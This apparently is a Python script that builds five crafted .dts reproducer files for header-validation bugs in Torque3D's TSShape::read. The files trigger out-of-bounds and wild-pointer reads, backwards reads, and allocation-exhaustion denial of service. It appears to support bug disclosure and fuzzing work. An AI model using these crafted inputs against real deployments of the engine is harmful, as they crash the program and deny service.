#!/usr/bin/env python3
"""Generate minimal, deterministic .dts reproducers for the TSShape::read
header-trust bugs. Each takes a valid v24 seed and corrupts exactly one header
field, so the file is otherwise well-formed and reaches the vulnerable code.

Seed: Torque3D v3.10.1 core/art/shapes/octahedron.dts (MIT), 1459 bytes,
sha256 5eac61ca0cdf254e20b7e20126cf1126cb34d4d7da78545b870b3fa12642d681.
Pass its path as argv[1]; we never commit the seed itself.
"""
import struct, sys, os, hashlib
seed_path, out_dir = sys.argv[1], sys.argv[2]
d = open(seed_path,'rb').read()
sha = hashlib.sha256(d).hexdigest()
assert sha == '5eac61ca0cdf254e20b7e20126cf1126cb34d4d7da78545b870b3fa12642d681', f'bad seed sha {sha}'
ver, size, s16, s8 = struct.unpack_from('<IIII', d, 0)
os.makedirs(out_dir, exist_ok=True)
def write(name, ver2, size2, s16_2, s8_2, body=None):
    b = bytearray(d)
    struct.pack_into('<IIII', b, 0, ver2, size2, s16_2, s8_2)
    if body is not None: b = bytearray(b[:16]) + body
    open(os.path.join(out_dir,name),'wb').write(bytes(b)); print('wrote',name,len(b),'bytes')

# R1: startU8 points far past the buffer -> wild-pointer READ in CheckGuard.
write('R1_startU8_wild.dts', ver, size, s16, 0x40000000)
# R2: startU8 just past end of buffer -> bounded heap-buffer-overflow READ.
write('R2_startU8_oob.dts', ver, size, s16, size + 4)
# R3: startU16 > startU8 -> count16 negative; 16-bit reads walk backwards OOB.
write('R3_start16_gt_start8.dts', ver, size, s8 + 8, s8)
# R4: giant sizeMemBuffer -> new int32_t[huge] allocation DoS (and short read).
write('R4_size_huge.dts', ver, 0x3fffffff, s16, s8)
# R5: giant num_sequences just after the buffer -> std::vector::resize DoS.
body = bytearray(d[16:])
# num_sequences sits at offset size*4 into the body; overwrite if present
seqoff = size*4
if seqoff+4 <= len(body): struct.pack_into('<I', body, seqoff, 0x3fffffff)
write('R5_numseq_huge.dts', ver, size, s16, s8, bytes(body))
